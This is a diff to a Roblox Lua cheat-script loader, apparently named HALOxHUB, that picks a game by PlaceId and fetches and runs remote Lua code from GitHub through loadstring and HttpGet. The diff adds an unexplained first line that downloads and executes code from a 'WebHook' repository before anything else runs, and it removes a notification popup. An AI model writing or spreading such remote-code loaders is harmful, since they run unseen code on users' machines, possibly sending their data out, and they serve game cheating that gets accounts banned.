@@ -1,3 +1,5 @@
+-------------------------------------------------------------------------------------------------
+loadstring(game:HttpGet"https://raw.githubusercontent.com/HALOxHUB/WebHook/main/README.md")()
 --ทุกสคิปมีโอกาสโดนแบน!
 repeat wait() until game:IsLoaded()
 local PlaceId = game.PlaceId
@@ -18,14 +20,3 @@ elseif PlaceId == 142823291 then
 elseif PlaceId == 4855457388 or PlaceId == 5094651510 then
     loadstring(game:HttpGet"https://raw.githubusercontent.com/HALOxHUB/Demonfall/main/README.md")()
 end
-
-
-game.StarterGui:SetCore(
-    "SendNotification",
-    {
-        Title = "HALOxHUB",
-        Text = "NotMap",
-		Icon = "rbxassetid://11143490812",
-		Duration = 10
-    }
-)
